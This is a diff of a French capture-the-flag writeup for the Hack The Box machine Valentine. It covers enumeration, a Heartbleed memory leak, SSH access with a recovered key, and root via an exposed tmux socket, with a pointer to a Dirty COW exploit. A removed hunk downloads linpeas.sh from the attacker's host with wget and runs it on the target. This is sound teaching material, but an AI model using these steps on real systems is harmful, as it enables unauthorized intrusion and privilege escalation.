@@ -11,9 +11,9 @@ draft: false
 
 # --- PaperMod / navigation ---
 type: "writeups"
-summary: "Exploitation de la faille Heartbleed puis élévation de privilèges grâce à une session tmux mal sécurisée."
+summary: "Faille Heartbleed (CVE-2014-0160) puis élévation de privilèges via tmux mal sécurisé."
 description: "Writeup de Valentine (HTB Easy) : walkthrough pédagogique de l’exploitation d’Heartbleed expliquée simplement, extraction d’informations sensibles et progression guidée jusqu’à l’escalade finale."
-tags: ["Easy", "Heartbleed", "Tmux"]
+tags: ["HTB-Easy", "CVE-2014-0160", "Heartbleed", "OpenSSL", "SSH", "tmux", "linux-privesc"]
 categories: ["Mes writeups"]
 
 # --- TOC & mise en page ---
@@ -95,12 +95,13 @@ mon-nmap valentine.htb
 #  - scans_nmap/udp_vuln_scan.txt
 ```
 
+------
 
 ### Scan initial
 
 Le scan initial TCP complet (`scans_nmap/full_tcp_scan.txt`) révèle les ports ouverts suivants :
 
-> Note : les IP et timestamps peuvent varier selon les resets HTB ; l’important ici est la surface exposée (Tomcat + RMI/JMX).
+> Note : les IP et timestamps peuvent varier selon les resets HTB ; l’important ici est la surface exposée (SSH + HTTP + HTTPS).
 
 ```bash
 # Nmap 7.95 scan initiated Mon Nov 24 15:53:27 2025 as: /usr/lib/nmap/nmap --privileged -Pn -p- --min-rate 5000 -T4 -oN scans_nmap/full_tcp_scan.txt valentine.htb
@@ -115,6 +116,8 @@ PORT    STATE SERVICE
 # Nmap done at Mon Nov 24 15:53:37 2025 -- 1 IP address (1 host up) scanned in 10.03 seconds
 
 ```
+
+------
 
 ### Scan agressif
 
@@ -177,7 +180,7 @@ OS and Service detection performed. Please report any incorrect results at https
 
 ```
 
-
+------
 
 ### Scan ciblé CMS
 
@@ -257,7 +260,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 ```
 
-
+------
 
 ### Scan UDP rapide
 
@@ -295,7 +298,7 @@ PORT      STATE         SERVICE
 
 ```
 
-
+------
 
 ### Scan des répertoires
 Pour la partie découverte de chemins web, j'utilise mon script dédié {{< script "mon-recoweb" >}}
@@ -304,7 +307,7 @@ Pour la partie découverte de chemins web, j'utilise mon script dédié {{< scri
 mon-recoweb valentine.htb
 ```
 
-Voici le résultat repris dans le fichier `scans-recoweb/RESULTS_SUMMARY.txt`
+Voici le résultat repris dans le fichier `scans_recoweb/RESULTS_SUMMARY.txt`
 
 ```bash
 ===== mon-recoweb — RÉSUMÉ DES RÉSULTATS =====
@@ -399,7 +402,7 @@ http://valentine.htb/index.php (CODE:200|SIZE:38)
 
 ```
 
-
+------
 
 ### Scan des vhosts
 Enfin, je teste rapidement la présence de vhosts  avec  {{< script "mon-subdomains" >}}
@@ -456,11 +459,11 @@ Le site web exposé par la machine est extrêmement minimaliste : il ne présent
 
 Commence par la télécharger et l'analyser à l'aide des outils et méthodes décrits dans la recette **{{< recette "outils-steganographie" >}}**, afin de vérifier si elle ne renferme pas un fichier embarqué, des métadonnées révélatrices ou un indice spécifique.
 
-Après avoir appliqué une série de ces techniques en commençant par `stegseek`, tu ne mets en évidence aucun élément utile, ce qui confirme que l’image ne constitue pas un vecteur d’exploitation dans ce cas.
+Après une vérification rapide (dont `stegseek`), rien de concluant : tu notes que l’image est un leurre / décor, puis tu reviens au signal fort de l’énumération : Heartbleed sur 443.
 
 ![Contenu de la page d’index du site web valentine.htb lors de l’accès initial](omg.jpg)
 
-
+------
 
 ### Heartbleed
 
@@ -606,7 +609,7 @@ Cette valeur apparaît de façon récurrente dans les fuites mémoire, ce qui at
 Décodage de la valeur :
 
 ```
-echo "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==" | base64 --decode
+echo "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==" | base64 --decode | tr -d '\n'
 ```
 
 Résultat :
@@ -695,7 +698,7 @@ cp hype_key_decoded /home/kali/tmp/
 Tu ajustes ensuite les permissions du fichier, condition indispensable pour que SSH accepte la clé :
 
 ```bash
-chmod 600 hype_key_decoded
+chmod 600 /home/kali/tmp/hype_key_decoded
 ```
 #### Connexion SSH avec la clé récupérée
 
@@ -716,6 +719,7 @@ La connexion aboutit avec succès et tu obtiens un shell interactif en tant que 
 
 ```bash
 ssh -i /home/kali/tmp/hype_key_decoded hype@valentine.htb
+
 ** WARNING: connection is not using a post-quantum key exchange algorithm.
 ** This session may be vulnerable to "store now, decrypt later" attacks.
 ** The server may need to be upgraded. See https://openssh.com/pq.html
@@ -761,32 +765,30 @@ ef7xxxxxxxxxxxxxxxxxxxxxxxxxxx24e0
 
 Tu récupères ainsi le **flag utilisateur**, confirmant la réussite de la phase d’exploitation et l’obtention d’un accès légitime sur la machine.
 
+------
+
+
+
 ## Escalade de privilèges
 
-### [copier linpeas.sh vers la cible](/recettes/copier-des-fichiers/){target="_blank" rel="noopener"}
-- dans kali linux
+Une fois connecté en SSH en tant que `hype` et conformément à la recette {{< recette "privilege-escalation-linux" >}}, l’escalade de privilèges débute par une série de vérifications systématiques :
+ l’analyse des droits sudo (`sudo -l`), l’observation des processus avec `pspy64`, la recherche de *Linux capabilities* (`getcap`), l’énumération des binaires SUID via `suid3num.py`, puis une première analyse globale du système à l’aide de `les.sh`.
 
-```bash
-cd ~/utilitaires
-python3 -m http.server
-```
+Dans le contexte de la machine Valentine, ces différentes étapes ne révèlent **aucune configuration directement exploitable**, à l’exception de **Dirty COW (CVE-2016-5195)**, identifiée par `les.sh` comme hautement probable sur ce système ancien.
 
-- Sur la cible, copie linpeas.sh dans /dev/shm car ce répertoire en mémoire vive est en écriture pour tous les utilisateurs et ne laisse aucune trace sur le disque.
+Afin de ne rien négliger, l’analyse se poursuit avec **`linpeas.sh`**, outil plus exhaustif permettant de centraliser les informations collectées et de confirmer les vecteurs d’escalade de privilèges disponibles.
 
-```bash
-cd /dev/shm
-wget http://<adresse tun0>:8000/linpeas.sh
-chmod +x linpeas.sh
-./linpeas.sh
-```
+Les différents outils d’énumération (pspy64, suid3num.py, les.sh, linpeas.sh, etc.) sont téléchargés au préalable sur la machine Kali, regroupés dans un répertoire de travail dédié, puis transférés sur la cible avant exécution, selon la procédure décrite dans la recette {{< recette "copier-fichiers-kali" >}}. Cette organisation garantit un workflow clair, reproductible et cohérent tout au long du challenge.
 
-### analyse linpeas
+------
 
-Dans linpeas les vulnérabilités sont classées et surlignées en couleur.
+### Analyse avec linpeas.sh
+
+Dans **LinPEAS**, les vulnérabilités potentielles sont classées et surlignées par couleur.
 
 ![Légende des couleurs de LinPEAS indiquant le niveau de criticité des vulnérabilités](linpeas-legend.png)
 
-Dans les résultats de linpeas.sh tu verras cette ligne surlignée en rouge+jaune:
+Dans les résultats de `linpeas.sh`, la ligne suivante apparaît surlignée en rouge et jaune :
 
 ![Résultat de LinPEAS signalant la présence de tmux, mis en évidence en rouge et jaune](linpeas-tmux.png)
 
@@ -804,13 +806,16 @@ Ici, le socket est :
 /.devs/dev_sess
 ```
 
+------
+
 ### Ce que ça implique
 
-Si on peut écrire sur ce socket, on peut :
+- Si tu peux écrire sur ce socket, tu peux :
+  - t’attacher à une session root
+  - prendre le contrôle du shell
+  - obtenir un shell root complet immédiatement
 
-- **s'attacher à une session root**
-- **prendre le contrôle du shell root**
-- **obtenir un root shell complet immédiatement**
+------
 
 ### Vérifications 
 
@@ -821,7 +826,7 @@ ls -l /.devs/dev_sess
 srw-rw---- 1 root hype 0 Nov 26 00:30 /.devs/dev_sess
 ```
 
-ce qui montre que que tu as l’accès en écriture au socket.
+ce qui montre que tu disposes d’un accès en écriture au socket.
 
 Puis tu t’attaches avec :
 
@@ -835,7 +840,9 @@ Le résultat est un prompt root :
 root@valentine:~#
 ```
 
-**Tu es devenu root.**
+**L’accès root est obtenu.**
+
+------
 
 ### root.txt
 
@@ -844,13 +851,25 @@ root@Valentine:/# cat /root/root.txt
 32ecxxxxxxxxxxxxxxxxxxxxxxxxxb08
 ```
 
+------
 
+## Bonus — Dirty COW (CVE-2016-5195)
 
----
+L’énumération locale a mis en évidence la vulnérabilité kernel **Dirty COW (CVE-2016-5195)**, confirmée comme exploitable sur cette version ancienne d’Ubuntu (12.04, kernel 3.2.0).  
+Cette vulnérabilité permet, via une condition de concurrence (*race condition*), d’élever ses privilèges jusqu’à root sans disposer de droits sudo.
+
+Dans le cadre de ce challenge, cette piste n’a toutefois pas été exploitée.  
+L’analyse approfondie avec **linpeas.sh** a permis d’identifier une configuration bien plus directe : une session **tmux appartenant à root**, accessible via un socket dont l’utilisateur `hype` dispose des droits en écriture.
+
+**Ce choix illustre une approche volontairement pragmatique : lorsqu’une escalade de privilèges non-kernel, stable et immédiate est disponible, elle doit être privilégiée par rapport à une exploitation kernel plus intrusive.**
+
+À titre d’exercice complémentaire, libre à toi d’explorer également l’exploitation de **Dirty COW (CVE-2016-5195)** sur cette machine.  Un proof-of-concept fiable et largement documenté est notamment disponible sur [Exploit-DB (ID 40616)](https://www.exploit-db.com/exploits/40616).
+
+------
 
 ## Conclusion
 
-En résumé, Valentine s'appuie sur une chaîne d'exploitation cohérente et pédagogique : la détection de **Heartbleed**, l'extraction de données en mémoire, la récupération d'éléments d'authentification puis l'accès final à l'utilisateur. L'escalade de privilèges repose ensuite sur une configuration **tmux** laissée accessible, offrant un **accès root** immédiat. L'ensemble illustre parfaitement l'importance d'une énumération rigoureuse, de l'analyse attentive des données récupérées et de la vérification des services persistants au niveau système. Une machine simple, mais très formatrice pour réviser les bases de l'exploitation et du post-exploitation.
+Valentine est une machine HTB Easy idéale pour réviser une chaîne d’attaque courte et logique : détection d’Heartbleed (CVE-2014-0160) sur OpenSSL, fuite mémoire, extraction d’une donnée réutilisable, puis accès SSH en tant qu’utilisateur. L’escalade de privilèges illustre ensuite un classique de post-exploitation : une session tmux root exposée via un socket accessible, qui permet d’obtenir un shell root immédiatement. Ce challenge rappelle qu’une énumération rigoureuse et la lecture attentive des artefacts récupérés suffisent souvent à faire toute la différence
 
 ---
 
